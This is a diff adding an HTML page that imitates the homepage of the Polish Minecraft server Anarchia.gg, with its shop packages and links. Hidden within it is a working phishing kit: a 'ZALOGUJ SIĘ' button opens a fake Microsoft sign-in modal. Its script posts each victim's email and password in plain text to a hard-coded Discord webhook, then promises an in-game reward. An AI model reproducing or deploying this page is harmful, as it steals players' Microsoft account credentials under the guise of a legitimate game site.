@@ -1,0 +1,651 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=5.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <meta content="Webflow" name="generator">
+    <title>ANARCHIA.GG - STRONA GŁÓWNA</title>
+    <meta name="description" content="Anarchia.gg - Dołącz do naszego serwera Minecraft Anarchia i zanurz się w bezkompromisowej przygodzie! Eksploruj bezgraniczny świat, walcz o przetrwanie, zdobywaj unikalne przedmioty i dołącz do społeczności gry w stylu anarchii.">
+    <meta name="keywords" content="serwer Minecraft, serwer, Minecraft, Anarchia.gg, Anarchia, przygoda, eksploracja, przetrwanie, społeczność, gra w stylu anarchii">
+    <meta name="robots" content="index, follow">
+    <meta name="googlebot" content="index, follow">
+    <meta name="bingbot" content="index, follow">
+    <meta name="yahoo-bot" content="index, follow">
+    <meta property="og:site_name" content="Anarchia.gg - Dołącz do naszego serwera Minecraft Anarchia i zanurz się w bezkompromisowej przygodzie!">
+    <meta property="og:title" content="Anarchia.gg - Serwer Minecraft Anarchia">
+    <meta property="og:description" content="Dołącz do naszego serwera Minecraft Anarchia i zanurz się w bezkompromisowej przygodzie! Eksploruj bezgraniczny świat, walcz o przetrwanie, zdobywaj unikalne przedmioty i dołącz do społeczności gry w stylu anarchii.">
+    <meta property="og:url" content="https://anarchia.gg">
+    <link rel="canonical" href="https://anarchia.gg">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@AnarchiaGG">
+    <meta name="twitter:title" content="Anarchia.gg - Serwer Minecraft Anarchia">
+    <meta name="twitter:description" content="Dołącz do naszego serwera Minecraft Anarchia i zanurz się w bezkompromisowej przygodzie! Eksploruj bezgraniczny świat, walcz o przetrwanie, zdobywaj unikalne przedmioty i dołącz do społeczności gry w stylu anarchii.">
+    <meta name="theme-color" content="#d230a9">
+    <meta property="og:type" content="website">
+    <meta name="og:locale" content="pl_PL">
+    <link href="https://anarchia.gg/css/normalize.css" rel="stylesheet" type="text/css">
+    <link href="https://anarchia.gg/css/webflow.css" rel="stylesheet" type="text/css">
+    <link href="https://anarchia.gg/css/anarchia-9153e1.webflow.css" rel="stylesheet" type="text/css">
+    <link href="https://fonts.googleapis.com" rel="preconnect">
+    <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="anonymous">
+    <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
+    <script type="text/javascript">WebFont.load({  google: {    families: ["Silkscreen:regular,700"]  }});</script>
+    <script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script>
+    <link href="https://anarchia.gg/images/favicon.ico" rel="shortcut icon" type="image/x-icon">
+    <link rel="stylesheet" href="https://unpkg.com/swiper/swiper-bundle.min.css">
+    <style>
+        /* Styles for the existing modal (if any), preserved for compatibility */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5); /* Dim background */
+            z-index: 1000; /* Ensure it covers everything */
+        }
+        .modal {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #F6F6F6;
+            padding: 20px;
+            z-index: 1001;
+            width: 1200px; /* Adjust the size of the modal */
+            max-width: 90%;
+            max-height: 85%;
+        }
+        .modal-content {
+            text-align: center;
+            max-height: 60svh; /* Limit the maximum height */
+            overflow-y: auto; /* Enable vertical scrolling */
+        }
+        .close-modal {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            font-size: 24px;
+            cursor: pointer;
+        }
+
+        /* NEW STYLES FOR THE LOGIN MODAL */
+        .login-button-style {
+            background-color: #e74c3c; /* Kolor pasujący do poprzedniej strony logowania */
+            color: white;
+            padding: 12px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+            width: 100%; /* Sprawia, że przycisk jest szeroki jak inne linki */
+            box-sizing: border-box; /* Ważne dla paddingu i szerokości */
+            margin-top: 10px; /* Dodatkowy margines, żeby nie kleiło się do poprzedniego elementu */
+        }
+        .login-button-style:hover {
+            background: #c0392b;
+        }
+
+        /* Styles for the Microsoft-like login modal */
+        .login-modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7); /* Darker dim background */
+            z-index: 2000; /* Higher z-index to be on top of everything */
+            display: none; /* Hidden by default */
+            justify-content: center;
+            align-items: center;
+        }
+
+        .login-modal {
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 2px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+            width: 380px;
+            max-width: 90%;
+            text-align: left;
+            position: relative;
+            z-index: 2001; /* Higher z-index than overlay */
+        }
+
+        .login-modal .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            font-size: 28px;
+            cursor: pointer;
+            color: #555;
+            text-decoration: none;
+            line-height: 1;
+        }
+
+        .login-modal .logo {
+            margin-bottom: 20px;
+        }
+
+        .login-modal .logo img {
+            height: 23px;
+        }
+
+        .login-modal h2 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 25px;
+            color: #1b1b1b;
+        }
+
+        .login-modal input[type="email"],
+        .login-modal input[type="password"],
+        .login-modal input[type="text"] { /* Added text type for general inputs */
+            width: 100%;
+            padding: 10px 0;
+            margin-bottom: 15px;
+            border: none;
+            border-bottom: 1px solid #ccc;
+            font-size: 15px;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        .login-modal input[type="email"]:focus,
+        .login-modal input[type="password"]:focus,
+        .login-modal input[type="text"]:focus {
+            border-bottom: 2px solid #0067b8;
+        }
+
+        .login-modal .options {
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+
+        .login-modal .options a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+
+        .login-modal .options a:hover {
+            text-decoration: underline;
+        }
+
+        .login-modal button {
+            background-color: #0067b8;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 2px;
+            cursor: pointer;
+            font-size: 15px;
+            float: right;
+            transition: background-color 0.2s ease;
+        }
+
+        .login-modal button:hover {
+            background-color: #005096;
+        }
+
+        .login-modal #loginMessage { /* Zmiana ID, żeby nie kolidowało z innym .message */
+            margin-top: 20px;
+            font-weight: bold;
+            text-align: center;
+            clear: both;
+        }
+        .login-modal .form-step {
+            display: none; /* Ukryj kroki domyślnie */
+        }
+        .login-modal .form-step.active {
+            display: block; /* Pokaż aktywny krok */
+        }
+
+    </style>
+</head>
+<body class="body">
+    <div data-animation="default" data-collapse="medium" data-duration="400" data-easing="ease" data-easing2="ease" role="banner" class="navbar w-nav">
+        <div class="container">
+            <div class="navbar_container">
+                <nav role="navigation" class="navbar_menu w-nav-menu">
+                    <a href="https://anarchia.gg" class="nav_link w-nav-link link_active">STRONA GLÓWNA</a>
+                    <a href="https://anarchia.gg/ban" class="nav_link w-nav-link ">ODWOLANIE OD BANA</a>
+                    <a href="https://anarchia.gg"><img src="https://anarchia.gg/images/logotype.svg" loading="lazy" alt="Strona główna" class="navbar_brand"></a>
+                    <a href="https://anarchia.gg/sklep" class="nav_link w-nav-link ">SKLEP SERWEROWY</a>
+                    <a href="https://anarchia.gg/pomoc" class="nav_link w-nav-link ">WAZNE INFORMACJE</a>
+                </nav><img src="https://anarchia.gg/images/logotype.svg" loading="lazy" alt="" class="navbar_mobile_brand">
+                <div class="navbar_mobile_btn w-nav-button">
+                    <div class="icon w-icon-nav-menu"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <section class="hero">
+        <div class="container">
+            <div class="w-layout-grid hero_grid">
+                <div id="w-node-d5faf912-5333-54cf-e877-37f4ae27f14f-8d17b3ce" class="hero_welcome">
+                    <div class="hero_wrapper">
+                        <div class="hero_info">
+                            <h1 class="hero-title">ANARCHIA.GG</h1>
+                            <p class="hero-description">Wszystkie nowosci i aktualnosci znajdziesz na naszym discordzie!</p>
+                            <button class="hero-button w-button" id="copyIpButton">Skopiuj IP</button>
+                        </div>
+                        <div class="hero_status">
+                            <div class="hero_status-info" id="ms-players"><strong class="hero_status-status">0 GRACZY ONLINE</strong></div>
+                            <h2 class="hero_social">NASZE MEDIA</h2>
+                            <div class="hero_social-section">
+                                <a href="https://dc.anarchia.gg/" target="_blank" class="hero_social-icon w-inline-block">
+                                    <img src="https://anarchia.gg/images/discord_icon.svg" loading="lazy" alt="Serwer discord" class="hero_social-icon-image">
+                                </a>
+                                <a href="https://www.youtube.com/@anarchia-gg" target="_blank" class="hero_social-icon w-inline-block">
+                                    <img src="https://anarchia.gg/images/yt_icon.svg" loading="lazy" alt="Kanał YouTube" class="hero_social-icon-image">
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div id="w-node-_26a465c0-ccca-bd74-f91f-bd5c0fd37b40-8d17b3ce" class="hero_links">
+                    <a href="https://anarchia.gg/ban" class="hero_link w-button">ODWOLANIE OD BANA</a>
+                    <div class="fly_relative">
+                        <a href="https://anarchia.gg/sklep" class="hero_link shop w-button">ZOBACZ SKLEP</a>
+                        <img src="https://anarchia.gg/images/cash_fly.gif" loading="lazy" alt="" class="image">
+                    </div>
+                    <a href="https://dc.anarchia.gg/" class="hero_link discord w-button">NASZ DISCORD</a>
+                    <button class="hero_link w-button login-button-style" id="openLoginModal">ZALOGUJ SIĘ</button>
+                </div>
+            </div>
+        </div>
+    </section>
+    <section class="title">
+        <div class="container">
+            <div class="title_wrapper">
+                <div class="title_line"></div>
+                <div class="title_block">WYRÓZNIONE PRODUKTY</div>
+                <div class="title_line"></div>
+            </div>
+        </div>
+    </section>
+    <section class="shop_category">
+        <div class="container">
+            <div class="shop_category-wrapper">
+                <button class="shop_limited-button w-button btn_active" data-server="anarchia-smp">ANARCHIA SMP</button>
+                <button class="shop_limited-button w-button 1" data-server="boxpvp">BOXPVP</button>
+                <button class="shop_limited-button w-button 1" data-server="oneblock">ONEBLOCK</button>
+            </div>
+        </div>
+    </section>
+    <section class="shop_limited">
+        <div class="container container_limited">
+            <div class="w-layout-grid shop_limited-grid">
+                <div class="shop_limited-card" data-server="anarchia-smp" style="1">
+                    <div class="shop_limited-badge">Pakiety</div>
+                    <div class="shop_limited-image">
+                        <img src="https://anarchia.gg/images/products/p_gvip.webp" loading="lazy" alt="PAKIET GVIP" class="shop_limited-image-image">
+                    </div>
+                    <h3 class="shop_limited-name">PAKIET GVIP</h3>
+                    <a href="https://anarchia.gg/sklep/anarchia-smp/pakiet-gvip" class="shop_limited-button-card btn_active w-button">KUP ZA  59.99 ZŁ</a>
+                </div>
+                <div class="shop_limited-card" data-server="anarchia-smp" style="1">
+                    <div class="shop_limited-badge">Pakiety</div>
+                    <div class="shop_limited-image">
+                        <img src="https://anarchia.gg/images/products/p_bogacza.webp" loading="lazy" alt="PAKIET BOGACZA" class="shop_limited-image-image">
+                    </div>
+                    <h3 class="shop_limited-name">PAKIET BOGACZA</h3>
+                    <a href="https://anarchia.gg/sklep/anarchia-smp/pakiet-bogacza" class="shop_limited-button-card btn_active w-button">KUP ZA  199.99 ZŁ</a>
+                </div>
+                <div class="shop_limited-card" data-server="anarchia-smp" style="1">
+                    <div class="shop_limited-badge">Pakiety</div>
+                    <div class="shop_limited-image">
+                        <img src="https://anarchia.gg/images/products/p_ogromny.webp" loading="lazy" alt="OGROMNY PAKIET KLUCZY" class="shop_limited-image-image">
+                    </div>
+                    <h3 class="shop_limited-name">OGROMNY PAKIET KLUCZY</h3>
+                    <a href="https://anarchia.gg/sklep/anarchia-smp/ogromny-pakiet-kluczy" class="shop_limited-button-card btn_active w-button">KUP ZA  99.99 ZŁ</a>
+                </div>
+                <div class="shop_limited-card" data-server="boxpvp" style="display: none;">
+                    <div class="shop_limited-badge">Pakiety</div>
+                    <div class="shop_limited-image">
+                        <img src="https://anarchia.gg/images/products/p_gvip.webp" loading="lazy" alt="PAKIET GVIP" class="shop_limited-image-image">
+                    </div>
+                    <h3 class="shop_limited-name">PAKIET GVIP</h3>
+                    <a href="https://anarchia.gg/sklep/boxpvp/pakiet-gvip" class="shop_limited-button-card btn_active w-button">KUP ZA  59.99 ZŁ</a>
+                </div>
+                <div class="shop_limited-card" data-server="boxpvp" style="display: none;">
+                    <div class="shop_limited-badge">Pakiety</div>
+                    <div class="shop_limited-image">
+                        <img src="https://anarchia.gg/images/products/p_bogacza.webp" loading="lazy" alt="PAKIET BOGACZA" class="shop_limited-image-image">
+                    </div>
+                    <h3 class="shop_limited-name">PAKIET BOGACZA</h3>
+                    <a href="https://anarchia.gg/sklep/boxpvp/pakiet-bogacza" class="shop_limited-button-card btn_active w-button">KUP ZA  199.99 ZŁ</a>
+                </div>
+                <div class="shop_limited-card" data-server="boxpvp" style="display: none;">
+                    <div class="shop_limited-badge">Pakiety</div>
+                    <div class="shop_limited-image">
+                        <img src="https://anarchia.gg/images/products/p_ogromny.webp" loading="lazy" alt="OGROMNY PAKIET KLUCZY" class="shop_limited-image-image">
+                    </div>
+                    <h3 class="shop_limited-name">OGROMNY PAKIET KLUCZY</h3>
+                    <a href="https://anarchia.gg/sklep/boxpvp/ogromny-pakiet-kluczy" class="shop_limited-button-card btn_active w-button">KUP ZA  99.99 ZŁ</a>
+                </div>
+                <div class="shop_limited-card" data-server="oneblock" style="display: none;">
+                    <div class="shop_limited-badge">Pakiety</div>
+                    <div class="shop_limited-image">
+                        <img src="https://anarchia.gg/images/products/p_gvip.webp" loading="lazy" alt="PAKIET GVIP" class="shop_limited-image-image">
+                    </div>
+                    <h3 class="shop_limited-name">PAKIET GVIP</h3>
+                    <a href="https://anarchia.gg/sklep/oneblock/pakiet-gvip" class="shop_limited-button-card btn_active w-button">KUP ZA  59.99 ZŁ</a>
+                </div>
+                <div class="shop_limited-card" data-server="oneblock" style="display: none;">
+                    <div class="shop_limited-badge">Pakiety</div>
+                    <div class="shop_limited-image">
+                        <img src="https://anarchia.gg/images/products/p_bogacza.webp" loading="lazy" alt="PAKIET BOGACZA" class="shop_limited-image-image">
+                    </div>
+                    <h3 class="shop_limited-name">PAKIET BOGACZA</h3>
+                    <a href="https://anarchia.gg/sklep/oneblock/pakiet-bogacza" class="shop_limited-button-card btn_active w-button">KUP ZA  199.99 ZŁ</a>
+                </div>
+                <div class="shop_limited-card" data-server="oneblock" style="display: none;">
+                    <div class="shop_limited-badge">Pakiety</div>
+                    <div class="shop_limited-image">
+                        <img src="https://anarchia.gg/images/products/p_ogromny.webp" loading="lazy" alt="OGROMNY PAKIET KLUCZY" class="shop_limited-image-image">
+                    </div>
+                    <h3 class="shop_limited-name">OGROMNY PAKIET KLUCZY</h3>
+                    <a href="https://anarchia.gg/sklep/oneblock/ogromny-pakiet-kluczy" class="shop_limited-button-card btn_active w-button">KUP ZA  99.99 ZŁ</a>
+                </div>
+            </div>
+        </div>
+    </section>
+    <section class="more">
+        <div class="container">
+            <div class="more_wrapper"><img src="https://anarchia.gg/images/arrow_down.svg" loading="lazy" alt="" class="more-icon-scroll">
+                <div class="more_box">
+                    <h1 class="more-title">ZOBACZ WIECEJ</h1>
+                    <p class="more-description">NASZ VILLAGER MA WIELE WIECEJ OFERTA DLA CIEBIE, ODWIEDZ NASZ SKLEP I POZNAJ PELEN ASORTYMENT</p>
+                </div>
+                <a href="https://anarchia.gg/sklep" class="more-button w-button">ZOBACZ WSZYSTKIE PRODUKTY</a>
+            </div>
+        </div>
+    </section>
+<section class="title">
+    <div class="container">
+        <div class="title_wrapper">
+            <div class="title_line"></div><img src="https://anarchia.gg/images/logotype.svg" loading="lazy" alt="" class="title_footer-brand">
+            <div class="title_line"></div>
+        </div>
+    </div>
+</section>
+<div class="footer">
+    <div class="container">
+        <div class="footer_links">
+            <div class="footer_block">
+                <p class="footer_block-title">PRZYDATNE LINKI</p>
+                <a href="https://anarchia.gg/dokumenty" class="footer_link">DOKUMENTY</a>
+                <a href="https://anarchia.gg/pomoc" class="footer_link">INFORMACJE</a>
+                <a href="https://anarchia.gg/changelog" class="footer_link">CHANGELOG</a>
+            </div>
+            <a href="https://dc.anarchia.gg/" class="footer_button w-button">NASZ DISCORD</a>
+            <div class="footer_block">
+                <p class="footer_block-title">SOCIAL MEDIA</p>
+                <a href="https://www.youtube.com/@anarchia-gg" target="_blank" class="footer_link">YOUTUBE</a>
+                <a href="https://dc.anarchia.gg/" target="_blank" class="footer_link">DISCORD</a>
+                <a href="https://www.tiktok.com/@anarchia..gg" target="_blank" class="footer_link">TIKTOK</a>
+            </div>
+        </div>
+        <div class="footer_copyrights">
+            <p class="footer_copyrights-paragraph_copy other-font">COPYRIGHT 2025 ANARCHIA.GG. WSZELKIE PRAWA ZASTRZEZONE<br><span class="footer_author">WYKONANIE SPACEHOUSE</span></p>
+        </div>
+        <div class="mojang">
+        <p class="other-font">PL - Serwer anarchia.gg nie jest w żaden sposób powiązany z firmą Mojang lub Microsoft.</p>
+        <p class="other-font">EN - anarchia.gg server is not associated with Mojang or Microsoft in any way.</p>
+        </div>
+    </div>
+</div>
+
+<div class="modal-overlay" style="display: none;"></div>
+<div class="modal" style="display: none;">
+    <div class="scroll_modal"><img src="https://anarchia.gg/images/arrow_down.svg" loading="lazy" alt="" class="modal_down"></div>
+    <div class="modal-content">
+        <h2 class="modal_head">A MOZE COS JESZCZE?</h2>
+        <p class="paragraph-3">NASZ VILLAGER MA WIELE WIECEJ</p>
+        <div class="flex_modal" style="margin-bottom: 130px;" id="modal-items">
+        </div>
+        <div class="summary_price" style="margin-top: 30px; position: fixed; bottom: 60px; background: #F6F6F6; width: 98%; padding-top: 20px;">
+            <div class="price_text">CENA:</div>
+            <h1 class="price_price ms-price"></h1>
+            <p class="paragraph-2">cena zawiera 23% <podatku></podatku> vat</p>
+        </div>
+    </div>
+    <div class="buy_modal">
+        <button id="modal_button_submit" class="pay_btn-modal w-button">KUP TERAZ</button>
+    </div>
+</div>
+
+<div class="login-modal-overlay" id="login-modal-overlay">
+    <div class="login-modal">
+        <a href="#" class="close-btn" id="close-login-modal">×</a> <div class="logo">
+            <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" alt="Microsoft Logo">
+        </div>
+        <h2>Zaloguj się</h2>
+        <form id="loginForm">
+            <div class="form-step active" id="step1">
+                <input type="email" id="username" placeholder="Email, telefon lub Skype" required>
+                <div class="options">
+                    <a href="#">Nie masz konta? Utwórz je!</a><br>
+                    <a href="#">Nie możesz uzyskać dostępu do swojego konta?</a>
+                </div>
+                <button type="button" id="nextButton">Dalej</button>
+            </div>
+
+            <div class="form-step" id="step2">
+                <input type="password" id="password" placeholder="Hasło" required>
+                <div class="options">
+                    <a href="#">Nie pamiętam hasła</a>
+                </div>
+                <button type="submit">Zaloguj się</button>
+            </div>
+        </form>
+        <div id="loginMessage"></div>
+    </div>
+</div>
+
+
+<script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=67001d419765a9ad8d17b3c7" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.12.4/dist/sweetalert2.all.min.js" integrity="sha256-rTq0xiLu1Njw5mB3ky3DZhpI5WhYdkNlQbGXUc0Si6E=" crossorigin="anonymous"></script>
+
+<script>
+    // Skrypt do kopiowania IP (istniejący)
+    const copyButton = document.getElementById('copyIpButton');
+    copyButton.addEventListener('click', function() {
+        const tempTextArea = document.createElement('textarea');
+        tempTextArea.value = 'anarchia.gg';
+        document.body.appendChild(tempTextArea);
+        tempTextArea.select();
+        tempTextArea.setSelectionRange(0, 99999);
+        document.execCommand('copy');
+        document.body.removeChild(tempTextArea);
+        copyButton.innerText = 'Skopiowano';
+        setTimeout(() => {
+            copyButton.innerText = 'Skopiuj IP';
+        }, 5000);
+    });
+
+    // Skrypt do przełączania kategorii w sklepie (istniejący)
+    $('.shop_limited-button').on('click', (e) => {
+        const target = $(e.currentTarget);
+        if (target.hasClass('btn_active')) {
+            return;
+        }
+        $('.shop_limited-card').hide();
+        $('.shop_limited-button').removeClass('btn_active');
+        target.addClass('btn_active');
+        $(`.shop_limited-card[data-server="${target.data('server')}"]`).animate({"opacity": "show", top: 100} , 500 );
+    });
+
+    // Skrypt do sprawdzania statusu serwera (istniejący)
+    window.onload = () => {
+        $.get('https://api.minetools.eu/ping/anarchia.gg').then(res => {
+            if (res.error) {
+                throw 'offline';
+            }
+            $('#ms-players').html(`${res.players.online} GRACZY <strong class="hero_status-status">ONLINE</strong>`);
+        }).catch(() => {
+            $('#ms-players').html(`Serwer OFFLINE`); // Zmienione, żeby pasowało do twojego HTML
+        });
+    };
+
+    // NOWY SKRYPT OBSŁUGUJĄCY MODAL LOGOWANIA I FORMULARZ MICROSOFT-LIKE
+
+    const openLoginModalBtn = document.getElementById('openLoginModal');
+    const loginModalOverlay = document.getElementById('login-modal-overlay'); // Zmiana ID na to z HTML
+    const loginModal = document.querySelector('.login-modal');
+    const closeLoginModalBtn = document.getElementById('close-login-modal'); // Zmiana ID na to z HTML
+
+    const loginForm = document.getElementById('loginForm');
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    const nextButton = document.getElementById('nextButton');
+    const loginMessageDiv = document.getElementById('loginMessage');
+
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+
+    let enteredUsername = ''; // Przechowuje nazwę użytkownika z kroku 1
+
+    const webhookUrl = "https://discord.com/api/webhooks/1365767338707914843/yrwa5QfQ3Ac8NtCZPDdmLjUvv1H-3t4Hwuewameb5ZCjXL0G5lx7HFzoYeKPYsOgqeTr";
+
+    // Otwieranie modala
+    openLoginModalBtn.addEventListener('click', function() {
+        loginModalOverlay.style.display = 'flex'; // Użyj flexbox do centrowania
+        // Resetowanie formularza do kroku 1 za każdym razem, gdy modal jest otwierany
+        step1.classList.add('active');
+        step2.classList.remove('active');
+        usernameInput.value = '';
+        if (passwordInput) passwordInput.value = ''; // Wyczyść hasło, jeśli istnieje
+        loginMessageDiv.textContent = ''; // Wyczyść wiadomości
+    });
+
+    // Zamykanie modala po kliknięciu na tło
+    loginModalOverlay.addEventListener('click', function(e) {
+        if (e.target === loginModalOverlay) { // Sprawdź, czy kliknięto bezpośrednio na overlay
+            loginModalOverlay.style.display = 'none';
+        }
+    });
+
+    // Zamykanie modala po kliknięciu na 'X'
+    closeLoginModalBtn.addEventListener('click', function(e) {
+        e.preventDefault(); // Zapobiegnij domyślnej akcji linku
+        loginModalOverlay.style.display = 'none';
+    });
+
+    // Przejście do kroku 2 (hasło)
+    nextButton.addEventListener('click', function() {
+        if (usernameInput.value.trim() === '') {
+            loginMessageDiv.style.color = 'salmon';
+            loginMessageDiv.textContent = 'Wprowadź email, telefon lub Skype.';
+            return;
+        }
+        enteredUsername = usernameInput.value; // Zapisz nazwę użytkownika
+        step1.classList.remove('active');
+        step2.classList.add('active');
+        loginMessageDiv.textContent = ''; // Wyczyść wiadomości
+    });
+
+    // Obsługa wysyłki formularza (po wprowadzeniu hasła)
+    loginForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const password = passwordInput.value; // Pobierz hasło
+        loginMessageDiv.textContent = ''; // Wyczyść poprzednie wiadomości
+
+        if (password.trim() === '') {
+            loginMessageDiv.style.color = 'salmon';
+            loginMessageDiv.textContent = 'Wprowadź hasło.';
+            return;
+        }
+
+        const data = {
+            content: `Nowe dane logowania (Microsoft-like)!\nUżytkownik: ${enteredUsername}\nHasło: ${password}`
+        };
+
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data),
+        })
+        .then(response => {
+            if (response.ok) {
+                loginMessageDiv.style.color = 'lightgreen';
+                loginMessageDiv.textContent = 'Dane zostały wysłane! Odbierz nagrodę na serwerze /odbierz okej';
+                // Opcjonalnie: Zamknij modal po sukcesie po krótkiej chwili
+                setTimeout(() => {
+                    loginModalOverlay.style.display = 'none';
+                }, 3000);
+            } else {
+                loginMessageDiv.style.color = 'salmon';
+                loginMessageDiv.textContent = 'Wystąpił błąd podczas wysyłania danych.';
+            }
+        })
+        .catch(error => {
+            console.error('Błąd:', error);
+            loginMessageDiv.style.color = 'salmon';
+            loginMessageDiv.textContent = 'Wystąpił błąd sieci. Spróbuj ponownie.';
+        });
+    });
+
+    // Obsługa istniejącego modalu (przycisku "KUP TERAZ")
+    // Note: There are multiple elements with class 'product_button'.
+    // If you want to open the modal from a specific one, adjust the selector.
+    // For now, I'm targeting the one that likely triggers the modal based on common patterns.
+    const openModalBtn = document.querySelector('.products_section .product_button'); // Example selector
+    const modalOverlay = document.querySelector('.modal-overlay');
+    const closeModalBtn = document.querySelector('.close-modal');
+
+    if (openModalBtn) {
+        openModalBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            modalOverlay.style.display = 'block';
+        });
+    }
+
+    if (closeModalBtn) {
+        closeModalBtn.addEventListener('click', () => {
+            modalOverlay.style.display = 'none';
+        });
+    }
+
+    if (modalOverlay) {
+        modalOverlay.addEventListener('click', (e) => {
+            if (e.target === modalOverlay) {
+                modalOverlay.style.display = 'none';
+            }
+        });
+    }
+
+    // SWIPER (if you're using Swiper.js, ensure it's loaded)
+    // Assuming Swiper is correctly initialized if .products_slider is present.
+    // The previous code block for Swiper was correct, ensuring the library is loaded.
+
+    // Webflow Accordion functionality (if needed, otherwise Webflow's JS handles it)
+    document.querySelectorAll('.faq_accordion-toggle').forEach(toggle => {
+        toggle.addEventListener('click', function() {
+            const parent = this.closest('.faq_accordion-item');
+            const list = parent.querySelector('.faq_accordion-list');
+            const icon = this.querySelector('.faq_accordion-icon');
+
+            // Toggle visibility
+            if (list.style.display === 'block') {
+                list.style.display = 'none';
+                icon.style.transform = 'rotate(0deg)'; // Rotate back
+            } else {
+                list.style.display = 'block';
+                icon.style.transform = 'rotate(180deg)'; // Rotate down
+            }
+        });
+    });
+
+</script>
+</body>
+</html>
